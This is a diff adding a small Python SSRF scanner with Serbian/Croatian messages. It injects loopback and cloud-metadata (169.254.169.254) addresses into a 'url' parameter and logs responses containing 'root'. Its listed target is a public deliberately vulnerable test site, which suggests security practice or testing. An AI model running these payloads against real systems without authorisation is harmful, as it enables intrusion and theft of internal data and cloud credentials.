@@ -1,0 +1,33 @@
+import requests
+from utils.log_utils import log_to_sheet
+
+def test_ssrf(url):
+    payloads = [
+        "http://127.0.0.1",
+        "http://localhost",
+        "http://169.254.169.254",
+        "http://[::1]",
+    ]
+
+    for payload in payloads:
+        try:
+            test_url = f"{url}?url={payload}"
+            print(f"[+] Testiram SSRF sa: {test_url}")
+            response = requests.get(test_url, timeout=5)
+            if response.status_code == 200 and "root" in response.text.lower():
+                print(f"[!] Mogući SSRF: {test_url}")
+                log_to_sheet(__file__, f"SSRF VULN: {test_url}")
+        except Exception as e:
+            print(f"[-] Greška za {test_url}: {e}")
+
+def run_ssrf_tests():
+    print("[~] Pokrećem SSRF test...")
+    targets = [
+        "http://testphp.vulnweb.com",  # Dodaj još ciljeva po potrebi
+    ]
+
+    for target in targets:
+        test_ssrf(target)
+
+if __name__ == "__main__":
+    run_ssrf_tests()
